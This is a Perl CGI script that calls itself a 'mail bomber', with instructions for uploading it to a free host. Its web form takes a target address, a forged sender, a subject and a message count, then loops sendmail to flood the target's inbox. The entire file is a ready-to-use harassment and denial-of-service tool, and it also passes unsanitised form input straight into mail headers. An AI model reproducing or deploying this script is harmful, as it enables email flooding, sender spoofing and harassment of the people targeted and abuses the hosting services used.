#!/usr/local/bin/perl --
############################
# this mail bomber works on
# port5.com free hosting.
# to get it to work elsewhere
# you will need to change the
# path to perl above and the
# path to sendmail below.
# common sendmail paths are
# /usr/bin/sendmail
# /usr/sbin/sendmail
# /lib/sendmail
# or /usr/lib/sendmail
# common paths to perl are
# /usr/local/bin/perl
# /usr/bin/perl
# /usr/sbin/perl
# /usr/lib/perl
# /usr/local/perl
# just try them all if you 
# can't figure it out.
# when you have made them
# what they need to be
# then upload this file
# to your cgi-bin and chmod
# it to 755. you should be 
# ready to use it then. 
# surf to it via a browser
# and fill in the boxes
# and wait for it to tell you
# how far it got.
# pieces of this file were
# taken from other files,
# pieces were written from scratch
# as well.
# credit: i did it.
############################

$mailprog = "/usr/bin/sendmail";

# Get the input
read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});

# Split the name-value pairs
@pairs = split(/&/, $buffer);

foreach $pair (@pairs){
($name, $value) = split(/=/, $pair);
$value =~ tr/+/ /;
$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
$name =~ tr/+/ /;
$name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
$FORM{$name} = $value;
}

$test = "$FORM{'shit'}";

if ($test == 1){

print "Content-type: text/html\n\n";
$howmany = $FORM{'number'}*1;

$to = "$FORM{'recipient'}";
$from = "$FORM{'email'}";
$subject = "$FORM{'subject'}";
$message = "$FORM{'message'}";

for ($i=0; $i<$howmany; $i++){
open(MAIL, "|$mailprog -t");
print MAIL "To: $to\n";
print MAIL "From: $from\n";
print MAIL "Subject: $subject\n\n";
print MAIL "$message\n";
close (MAIL);
$x = $i+1;
print "Mail number $x sent.<br>\n";
}


} else {

print "Content-type: text/html\n\n";
print '<html><title>Bomb them.</title><form method=post action="bomb.cgi"><body bgcolor="#FFFFFF"><h2>fill in the fields and press the button...</h2>';

#################

print ' <table width="573" border="0" cellspacing="3" cellpadding="3">';
print ' <tr> ';
print ' <td width="134" align="right" valign="top"><font face="Arial, Helvetica, sans-serif" size="2">Bomb ';
print ' Who? </font></td>';
print ' <td width="418"> ';
print ' <input type="text" name="recipient" value="who@where.com">';
print ' </td>';
print ' </tr>';
print ' <tr> ';
print ' <td width="134" align="right" valign="top"><font face="Arial, Helvetica, sans-serif" size="2">From ';
print ' Who? </font></td>';
print ' <td width="418"> ';
print ' <input type="text" name="email" value="fakeemail@whereever.com">';
print ' </td>';
print ' </tr>';
print ' <tr> ';
print ' <td width="134" align="right" valign="top"><font face="Arial, Helvetica, sans-serif" size="2">Subject ';
print ' of emails: </font></td>';
print ' <td width="418"> ';
print ' <input type="text" name="subject" value="you suck man.">';
print ' </td>';
print ' </tr>';
print ' <tr> ';
print ' <td width="134" align="right" valign="top"><font face="Arial, Helvetica, sans-serif" size="2">Message ';
print ' in emails: </font></td>';
print ' <td width="418"> ';
print ' <textarea name="message" cols="35" rows="5" wrap="PHYSICAL"></textarea>';
print ' </td>';
print ' </tr>';
print ' <tr>';
print ' <td width="134" align="right" valign="top"><font face="Arial, Helvetica, sans-serif" size="2">How ';
print ' many emails to send:</font></td>';
print ' <td width="418">';
print ' <input type="text" name="number" value="50">';
print ' </td>';
print ' </tr>';
print ' <tr> ';
print ' <td width="134" align="right" valign="top"> </td>';
print ' <td width="418">';
print ' <input type="submit" name="Submit" value="Bomb Them">';
print ' <input type="reset" name="Submit2" value="Clear Form">';
print ' </td>';
print ' </tr>';
print ' </table><input type=hidden name=shit value="1">';


#################

print "</body></form></html>";

